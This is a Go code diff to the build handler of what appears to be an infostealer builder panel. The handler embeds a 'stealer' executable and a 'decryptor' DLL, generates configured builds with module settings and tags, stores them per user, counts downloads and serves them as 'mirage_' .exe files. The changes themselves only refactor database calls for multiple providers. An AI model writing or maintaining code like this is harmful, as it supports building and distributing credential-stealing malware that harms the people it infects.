@@ -15,6 +15,7 @@ import (
 	"github.com/go-chi/chi/v5"
 	"zialfi-panel/internal/middleware"
 	"zialfi-panel/internal/services"
+	"zialfi-panel/internal/db"
 )
 
 var safeIDPattern = regexp.MustCompile(`^[a-zA-Z0-9_-]+$`)
@@ -32,15 +33,11 @@ type BuildHandler struct {
 	stealerExe   []byte
 	decryptorDll []byte
 	db           *sql.DB
+	provider     db.ProviderType
 }
 
-func NewBuildHandler(service *services.BuildService, stealer, decryptor []byte, db *sql.DB) *BuildHandler {
-	return &BuildHandler{
-		service:      service,
-		stealerExe:   stealer,
-		decryptorDll: decryptor,
-		db:           db,
-	}
+func NewBuildHandler(service *services.BuildService, stealer, decryptor []byte, db *sql.DB, provider db.ProviderType) *BuildHandler {
+	return &BuildHandler{service: service, stealerExe: stealer, decryptorDll: decryptor, db: db, provider: provider}
 }
 
 func (h *BuildHandler) Build(w http.ResponseWriter, r *http.Request) {
@@ -83,7 +80,7 @@ func (h *BuildHandler) Build(w http.ResponseWriter, r *http.Request) {
 
 	modulesJSON, _ := json.Marshal(config.Modules)
 
-	result, err := h.db.Exec(
+	result, err := db.Exec(h.db, h.provider, 
 		`INSERT INTO builds (config_hash, file_size, file_data, sha256, build_tag, module_config, user_id)
 		 VALUES (?, ?, ?, ?, ?, ?, ?)`,
 		configHash, len(built), built, sha, config.BuildTag, string(modulesJSON), claimsUserID(r),
@@ -96,7 +93,7 @@ func (h *BuildHandler) Build(w http.ResponseWriter, r *http.Request) {
 	id, _ := result.LastInsertId()
 
 	var buildID, createdAt string
-	h.db.QueryRow("SELECT id, created_at FROM builds WHERE rowid = ?", id).Scan(&buildID, &createdAt)
+	db.QueryRow(h.db, h.provider, "SELECT id, created_at FROM builds WHERE rowid = ?", id).Scan(&buildID, &createdAt)
 
 	writeJSON(w, http.StatusCreated, map[string]any{
 		"id":         buildID,
@@ -114,24 +111,24 @@ func (h *BuildHandler) List(w http.ResponseWriter, r *http.Request) {
 	var err error
 	if tagFilter != "" {
 		if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
-			rows, err = h.db.Query(`
+			rows, err = db.Query(h.db, h.provider, `
 				SELECT id, config_hash, file_size, sha256, COALESCE(build_tag,''), download_count, created_at, COALESCE(module_config,'{}')
 				FROM builds WHERE build_tag = ? AND user_id = ? ORDER BY created_at DESC LIMIT 50
 			`, tagFilter, claims.UserID)
 		} else {
-			rows, err = h.db.Query(`
+			rows, err = db.Query(h.db, h.provider, `
 				SELECT id, config_hash, file_size, sha256, COALESCE(build_tag,''), download_count, created_at, COALESCE(module_config,'{}')
 				FROM builds WHERE build_tag = ? ORDER BY created_at DESC LIMIT 50
 			`, tagFilter)
 		}
 	} else {
 		if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
-			rows, err = h.db.Query(`
+			rows, err = db.Query(h.db, h.provider, `
 				SELECT id, config_hash, file_size, sha256, COALESCE(build_tag,''), download_count, created_at, COALESCE(module_config,'{}')
 				FROM builds WHERE user_id = ? ORDER BY created_at DESC LIMIT 50
 			`, claims.UserID)
 		} else {
-			rows, err = h.db.Query(`
+			rows, err = db.Query(h.db, h.provider, `
 				SELECT id, config_hash, file_size, sha256, COALESCE(build_tag,''), download_count, created_at, COALESCE(module_config,'{}')
 				FROM builds ORDER BY created_at DESC LIMIT 50
 			`)
@@ -179,7 +176,7 @@ func (h *BuildHandler) Download(w http.ResponseWriter, r *http.Request) {
 
 	var fileData []byte
 	var sha string
-	err := h.db.QueryRow("SELECT file_data, sha256 FROM builds WHERE id = ?", id).Scan(&fileData, &sha)
+	err := db.QueryRow(h.db, h.provider, "SELECT file_data, sha256 FROM builds WHERE id = ?", id).Scan(&fileData, &sha)
 	if err == sql.ErrNoRows {
 		writeError(w, http.StatusNotFound, "build not found")
 		return
@@ -194,7 +191,7 @@ func (h *BuildHandler) Download(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	h.db.Exec("UPDATE builds SET download_count = download_count + 1 WHERE id = ?", id)
+	db.Exec(h.db, h.provider, "UPDATE builds SET download_count = download_count + 1 WHERE id = ?", id)
 
 	w.Header().Set("Content-Type", "application/octet-stream")
 	w.Header().Set("Content-Disposition", fmt.Sprintf(`attachment; filename="mirage_%s.exe"`, id[:8]))
@@ -222,7 +219,7 @@ func (h *BuildHandler) UpdateTag(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	result, err := h.db.Exec("UPDATE builds SET build_tag = ? WHERE id = ?", body.Tag, id)
+	result, err := db.Exec(h.db, h.provider, "UPDATE builds SET build_tag = ? WHERE id = ?", body.Tag, id)
 	if err != nil {
 		writeError(w, http.StatusInternalServerError, "failed to update build tag")
 		return
@@ -293,12 +290,12 @@ func (h *BuildHandler) Stats(w http.ResponseWriter, r *http.Request) {
 	var rows *sql.Rows
 	var err error
 	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
-		rows, err = h.db.Query(`
+		rows, err = db.Query(h.db, h.provider, `
 			SELECT id, COALESCE(build_tag,''), download_count, file_size, created_at
 			FROM builds WHERE user_id = ? ORDER BY created_at DESC
 		`, claims.UserID)
 	} else {
-		rows, err = h.db.Query(`
+		rows, err = db.Query(h.db, h.provider, `
 			SELECT id, COALESCE(build_tag,''), download_count, file_size, created_at
 			FROM builds ORDER BY created_at DESC
 		`)
